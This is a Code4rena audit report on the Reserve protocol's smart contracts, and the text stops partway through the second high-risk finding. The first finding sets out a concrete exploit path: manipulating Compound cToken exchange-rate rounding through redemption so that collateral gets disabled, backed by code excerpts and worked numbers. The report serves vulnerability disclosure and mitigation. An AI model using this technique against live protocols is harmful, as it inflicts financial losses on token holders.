{
  "circa": {
    "title": "Reserve contest",
    "sponsor": "Reserve",
    "slug": "2023-01-reserve",
    "date": "2023-04-27",
    "findings": "https://github.com/code-423n4/2023-01-reserve-findings/issues",
    "contest": 203
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Reserve smart contract system written in Solidity. The audit contest took place between January 6—January 20 2023.</p>\n<p>Following the C4 audit contest, 3 wardens (0xA5DF, HollaDieWaldfee, and <a href=\"https://twitter.com/akshaysrivastv\">AkshaySrivastav</a>) reviewed the mitigations for all identified issues; the mitigation review report is appended below the audit contest report.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>76 Wardens contributed reports to the Reserve contest:</p>\n<ol>\n<li>0x52</li>\n<li>0xA5DF</li>\n<li><a href=\"https://twitter.com/0xAgro\">0xAgro</a></li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/0xTaylor_\">0xTaylor</a></li>\n<li><a href=\"https://twitter.com/0xdeadbeef____\">0xdeadbeef0x</a></li>\n<li>0xhacksmithh</li>\n<li><a href=\"https://twitter.com/akshaysrivastv\">AkshaySrivastav</a></li>\n<li>Awesome</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>BRONZEDISC</li>\n<li>Bauer</li>\n<li>Bnke0x0</li>\n<li>Breeje</li>\n<li>Budaghyan</li>\n<li>CodingNameKiki</li>\n<li><a href=\"https://www.cyfrin.io/\">Cyfrin</a> (<a href=\"https://twitter.com/PatrickAlphaC\">PatrickAlphaC</a> and <a href=\"https://twitter.com/giovannidisiena\">giovannidisiena</a> and <a href=\"https://twitter.com/hansfriese\">hansfriese</a>)</li>\n<li><a href=\"https://franfran.dev/\">Franfran</a></li>\n<li><a href=\"https://twitter.com/gallodasballo\">GalloDaSballo</a></li>\n<li>HollaDieWaldfee</li>\n<li>IceBear</li>\n<li>IllIllI</li>\n<li>JTJabba</li>\n<li>Madalad</li>\n<li>MyFDsYours</li>\n<li>NoamYakov</li>\n<li>RHaO-sec</li>\n<li>Rageur</li>\n<li>RaymondFam</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>SAAJ</li>\n<li>SaharDevep</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li>Soosh</li>\n<li><a href=\"https://github.com/udsene\">Udsen</a></li>\n<li>__141345__</li>\n<li>amshirif</li>\n<li>arialblack14</li>\n<li>brgltd</li>\n<li>btk</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://twitter.com/carlitox477\">carlitox477</a></li>\n<li>chaduke</li>\n<li>chrisdior4</li>\n<li>cryptonue</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>delfin454000</li>\n<li>descharre</li>\n<li>fs0c</li>\n<li>hihen</li>\n<li>immeas</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li><a href=\"https://twitter.com/Xc1008Cu\">ladboy233</a></li>\n<li>lukris02</li>\n<li>luxartvinsec</li>\n<li><a href=\"https://twitter.com/nadin20678790\">nadin</a></li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li><a href=\"https://twitter.com/@PavanKumarKv2\">pavankv</a></li>\n<li>peanuts</li>\n<li>pedr02b2</li>\n<li>rotcivegaf</li>\n<li>rvierdiiev</li>\n<li><a href=\"https://medium.com/@saneryee-studio\">saneryee</a></li>\n<li>severity (medium-or-low and critical-or-high)</li>\n<li>shark</li>\n<li>tnevler</li>\n<li>unforgiven</li>\n<li><a href=\"https://lenster.xyz/u/ustas\">ustas</a></li>\n<li>wait</li>\n<li>yongskiws</li>\n</ol>\n<p>This contest was judged by <a href=\"https://github.com/0xean\">0xean</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 27 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 25 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 41 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 35 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-01-reserve\">C4 Reserve contest repository</a>, and is composed of 12 smart contracts written in the Solidity programming language and includes 2,051 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-2\" style=\"position:relative;\"><a href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (2)</h1>\n<h2 id=\"h-01-adversary-can-abuse-a-quirk-of-compound-redemption-to-manipulate-the-underlying-exchange-rate-and-maliciously-disable-ctoken-collaterals\" style=\"position:relative;\"><a href=\"#h-01-adversary-can-abuse-a-quirk-of-compound-redemption-to-manipulate-the-underlying-exchange-rate-and-maliciously-disable-ctoken-collaterals\" aria-label=\"h 01 adversary can abuse a quirk of compound redemption to manipulate the underlying exchange rate and maliciously disable ctoken collaterals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/310\">[H-01] Adversary can abuse a quirk of compound redemption to manipulate the underlying exchange rate and maliciously disable cToken collaterals</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/310\">0x52</a></em></p>\n<p>Adversary can maliciously disable cToken collateral to cause loss to rToken during restructuring.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (referencePrice &lt; prevReferencePrice) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    markStatus(CollateralStatus.DISABLED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>CTokenNonFiatCollateral and CTokenFiatCollateral both use the default refresh behavior presented in FiatCollateral which has the above lines which automatically disables the collateral if the reference price ever decreases. This makes the assumption that cToken exchange rates never decrease but this is an incorrect assumption and can be exploited by an attacker to maliciously disable a cToken being used as collateral.</p>\n<p><a href=\"https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L480-L505\">CToken.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint redeemTokens;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint redeemAmount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /* If redeemTokensIn &gt; 0: */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (redeemTokensIn &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         * We calculate the exchange rate and the amount of underlying to be redeemed:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         *  redeemTokens = redeemTokensIn</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         *  redeemAmount = redeemTokensIn x exchangeRateCurrent</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        redeemTokens = redeemTokensIn;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        redeemAmount = mul_ScalarTruncate(exchangeRate, redeemTokensIn);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         * We get the current exchange rate and calculate the amount to be redeemed:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         *  redeemTokens = redeemAmountIn / exchangeRate</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         *  redeemAmount = redeemAmountIn</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // @audit redeemTokens rounds in favor of the user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        redeemTokens = div_(redeemAmountIn, exchangeRate);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        redeemAmount = redeemAmountIn;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The exchange rate can be manipulated by a tiny amount during the redeem process. The focus above is the scenario where the user requests a specific amount of underlying. When calculating the number of cTokens to redeem for a specific amount of underlying it rounds IN FAVOR of the user. This allows the user to redeem more underlying than the exchange rate would otherwise imply. Because the user can redeem <em>slightly</em> more than intended they can create a scenario in which the exchange rate actually drops after they redeem. This is because compound calculates the exchange rate dynamically using the current supply of cTokens and the assets under management.</p>\n<p><a href=\"https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L293-L312\">CToken.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function exchangeRateStoredInternal() virtual internal view returns (uint) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint _totalSupply = totalSupply;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_totalSupply == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         * If there are no tokens minted:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         *  exchangeRate = initialExchangeRate</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return initialExchangeRateMantissa;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         * Otherwise:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint totalCash = getCashPrior();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return exchangeRate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The exchangeRate when _totalSupply != 0 is basically:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">exchangeRate = netAssets * 1e18 / totalSupply</span></span></code></pre>\n<p>Using this formula for we can now walk through an example of how this can be exploited</p>\n<p>Example:</p>\n<p>cTokens always start at a whole token ratio of 50:1 so let’s assume this ratio to begin with. Let’s use values similar to the current supply of cETH which is ~15M cETH and ~300k ETH. We’ll start by calculating the current ratio:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">exchangeRate = 300_000 * 1e18 * 1e18 / 15_000_000 * 1e8 = 2e26 </span></span></code></pre>\n<p>Now to exploit the ratio we request to redeem 99e8 redeemAmount which we can use to calculate the amount of tokens we need to burn:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">redeemAmount = 99e8 * 1e18 / 2e26 = 1.98 -&gt; 1</span></span></code></pre>\n<p>After truncation the amount burned is only 1. Now we can recalculate our ratio:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">exchangeRate = ((300_000 * 1e18 * 1e18) - 99e8) / ((15_000_000 * 1e8) - 1) = 199999999999999933333333333</span></span></code></pre>\n<p>The ratio has now been slightly decreased. In CTokenFiatCollateral the exchange rate is truncated to 18 dp so:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">(referencePrice &lt; prevReferencePrice) -&gt; (19999999999999993 &lt;  2e18) == true </span></span></code></pre>\n<p>This results in that the collateral is now disabled. This forces the vault to liquidate their holdings to convert to a backup asset. This will almost certainly incur losses to the protocol that were maliciously inflicted.</p>\n<p>The path to exploit is relatively straightforward:</p>\n<p><code>refresh()</code> cToken collateral to store current rate -> Manipulate compound rate via redemption -> <code>refresh()</code> cToken collateral to disable</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Since the issue is with the underlying compound contracts, nothing can make the attack impossible but it can be made sufficiently difficult. The simplest deterrent would be to implement a rate error value (i.e. 100) so that the exchange rate has to drop more than that before the token is disabled. The recommended value for this is a bit more complicated to unpack. The amount that the exchange rate changes heavily depends on the number of cTokens minted. The larger the amount the less it changes. Additionally a malicious user can make consecutive redemptions to lower the rate even further. Using an error rate of 1e12 would make it nearly impossible for this to be exploited while still being very sensitive to real (and concerning) changes in exchange rate.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">-   if (referencePrice &lt; prevReferencePrice) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+   if (referencePrice &lt; prevReferencePrice - rateError) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        markStatus(CollateralStatus.DISABLED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/310#issuecomment-1399632835\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I do see in the cToken code base that the warden is correct with regard to the round down mechanism when redeeming cTokens using a redeemAmountIn.</p>\n<p>The question I think comes down to is this dust amount enough to counteract the interest that would be accrued to the cToken which is added during the refresh call in <code>CTokenFiatCollateral</code></p>\n<p>Will leave open for sponsor review. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/310#issuecomment-1404050632\">tmattimore (Reserve) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/310#issuecomment-1404051723\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Issue confirmed. </p>\n<p>Many defi protocols may have similar issues. We may choose to mitigate by building in revenue hiding to something like 1 part in 1 million to all collateral plugins. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR adds universal revenue hiding to all appreciating collateral: <a href=\"https://github.com/reserve-protocol/protocol/pull/620\">reserve-protocol/protocol#620</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/35\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/23\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/25\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"h-02-basket-range-formula-is-inefficient-leading-the-protocol-to-unnecessary-haircut\" style=\"position:relative;\"><a href=\"#h-02-basket-range-formula-is-inefficient-leading-the-protocol-to-unnecessary-haircut\" aria-label=\"h 02 basket range formula is inefficient leading the protocol to unnecessary haircut permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235\">[H-02] Basket range formula is inefficient, leading the protocol to unnecessary haircut</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235\">0xA5DF</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/317\">HollaDieWaldfee</a></em></p>\n<p>The <code>BackingManager.manageTokens()</code> function checks if there’s any deficit in collateral, in case there is, if there’s a surplus from another collateral token it trades it to cover the deficit, otherwise it goes for a ‘haircut’ and cuts the amount of basket ‘needed’ (i.e. the number of baskets RToken claims to hold).</p>\n<p>In order to determine how much deficit/surplus there is the protocol calculates the ‘basket range’, where the top range is the optimistic estimation of the number of baskets the token would hold after trading and the bottom range is a pessimistic estimation.</p>\n<p>The estimation is done by dividing the total collateral value by the price of 1  basket unit (for optimistic estimation the max value is divided by min price of basket-unit and vice versa).</p>\n<p>The problem is that this estimation is inefficient, for cases where just a little bit of collateral is missing the range ‘band’ (range.top - range.bottom) would be about 4% (when oracle error deviation is ±1%) instead of less than 1%.</p>\n<p>This can cause the protocol an unnecessary haircut of a few percent where the deficit can be solved by simple trading.</p>\n<p>This would also cause the price of <code>RTokenAsset</code> to deviate more than necessary before the haircut.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the following PoC, the basket changed so that it has 99% of the required collateral for 3 tokens and 95% for the 4th.</p>\n<p>The basket range should be 98±0.03% (the basket has 95% collateral + 4% of 3/4 tokens. That 4% is worth 3±0.03% if we account for oracle error of their prices), but in reality the protocol calculates it as ~97.9±2%.</p>\n<p>That range causes the protocol to avoid trading and go to 